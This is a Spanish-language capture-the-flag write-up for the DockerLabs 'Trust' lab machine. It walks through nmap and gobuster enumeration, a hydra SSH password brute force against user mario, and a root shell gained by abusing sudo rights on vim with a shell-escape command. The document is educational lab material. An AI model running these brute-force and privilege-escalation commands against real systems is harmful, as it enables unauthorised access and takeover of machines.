<section align="center">

# 💥Trust Write Up💥

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20Facil-green?style=for-the-badge)
![Plataforma](https://img.shields.io/badge/Plataforma-DockerLabs-blue?style=for-the-badge)

</section>

## 🚀 Despliegue

Una vez descargado el ctf, lo extreamos y accedemos a su respectiva carpeta desde la terminal, luego iniciamos la maquina con:

```bash
sudo bash auto_deploy.sh trust.tar
```

nos devuelve esto:

```bash
	                    ##        .         
	              ## ## ##       ==         
	           ## ## ## ##      ===         
	       /""""""""""""""""\___/ ===       
	  ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
	       \______ o          __/           
	         \    \        __/            
	          \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
				     
Se han detectado máquinas de DockerLabs previas, debemos limpiarlas para evitar problemas, espere un momento...
Se han detectado máquinas de DockerLabs previas, debemos limpiarlas para evitar problemas, espere un momento...

Estamos desplegando la máquina vulnerable, espere un momento.
La red dockernetwork ya existe. Eliminándola y recreándola...

Máquina desplegada, su dirección IP es --> 172.18.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

## 🔍Escaneo y enumeracion

para empezar con el ctf, realizamos un escaneo general con nmap:

```bash
nmap -p- 172.18.0.2
```

### 🛠️Parametros usados

| Parametro | Descripcion |
| :--- | :--- |
| **`-p-`** | indico que quiero un escaneo para todos los puertos, no solo los mas comunes |

nos devuelve esto:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-07 17:55 -03
Nmap scan report for 172.18.0.2
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.67 seconds
```

sabiendo que unicamente los puertos 22 con el servicio ssh y 80 con el servicio http estan abiertos, haremos un escaneo mas detallado a esos dos en especifico, con el siguiente comando:

```bash
nmap -p22,80 -sC -sV 172.18.0.2
```

### 🛠️Parametros usados

| Parametro | Descripcion |
| :--- | :--- |
| **`-p22,80`** | indico que solo quiero un escaneo para esos puertos en especifico |
| **`-sC`** | ejecuta varios scripts basicos para obtener informacion extra |
| **`-sV`** | me muestra la version que usa este servicio ftp |

nos devuelve:

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-07 17:55 -03
Nmap scan report for 172.18.0.2
Host is up (0.00019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.26 seconds
```

al no detectar alguna anomalia, realizo un escaneo de directorios y archivos que esten alojados en la web, en busqueda de algo que pueda ser importante, usando gobuster:

```bash
gobuster dir -u 172.18.0.2 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,js,json,txt
```

### 🛠️Parametros usados

| Parametro | Descripcion |
| :--- | :--- |
| **`dir`** | indico que realizare una busqueda de directorios web |
| **`-u`** | indico la direccion ip del escaneo |
| **`-w`** | indico el diccionario a utilizar |
| **`-x`** | indico que ademas de directorios, quiero buscar archivos con extenciones especificas(php,html,js,json,txt) |

al realizar ese escaneo, podemos encontrar la siguiente informacion:

```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,json,txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]
Progress: 176551 / 1323360 (13.34%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 179355 / 1323360 (13.55%)
===============================================================
Finished
===============================================================
```

nos llama la atencion ese archivo secret.php, ya que el index.html es el archivo inicial que se ve al acceder a la pagina web.  
Al acceder a ese archivo con la ruta "172.18.0.2/secret.php" veremos un mensaje que tiene el nombre mario, teniendo esa informacion, podemos asumir que hay un usuario llamado mario en el servicio ssh.

## ☠️Acceso SSH

sabiendo que el usuario puede ser Mario o mario, realizamos un ataque de fuerza bruta con hydra:

```bash
hydra -l mario -P rockyou.txt -t 64 ssh://172.18.0.2
```

lo que nos devuelve:

```bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-07 20:56:28
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344398 login tries (l:1/p:14344398), ~224132 tries per task
[DATA] attacking ssh://172.18.0.2:22/
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 11 final worker threads did not complete until end.
[ERROR] 11 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-07 20:56:50
```

teniendo el usuario y contraseña, accedemos al sistema por ssh:

```bash
ssh mario@172.18.0.2
```

### 🛠️Parametros usados

| Parametro | Descripcion |
| :--- | :--- |
| **`mario@`** | indico que el usuario que usare para conectarme por ssh |

al colocar la contraseña, nos aparecera asi:

```bash
Linux 6cfc3319b69a 6.14.0-29-generic #29~24.04.1-Ubuntu SMP PREEMPT_DYNAMIC Thu Aug 14 16:52:50 UTC 2 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
ario@6cfc3319b69a:~$ 
```

al escribir el comando whoami obtendremos:

```bash
mario@6cfc3319b69a:~$ whoami
mario
mario@6cfc3319b69a:~$  
```

## Escalada de privilegios

ahora, para volvernos usuario con permisos root, realizaremos un checkeo si hay posibles vectores de ataque:

```bash
mario@6cfc3319b69a:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on 6cfc3319b69a:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 6cfc3319b69a:
    (ALL) /usr/bin/vim
```

como podemos ver, podemos ejecutar el programa vim con permisos sudo, iremos a la web gtfobins para encontrar un comando para escalar privilegios:

encontraremos este comando que es el que nos interesa:

```bash
sudo vi -c ':!/bin/sh' /dev/null
```

como tenemos permisos sudo de vim, lo modificaremos un poco:

```bash
sudo vim -c ':!/bin/sh' /dev/null
```

Al hacerlo, seremos usuario root:

```bash
# whoami
root
# 
```

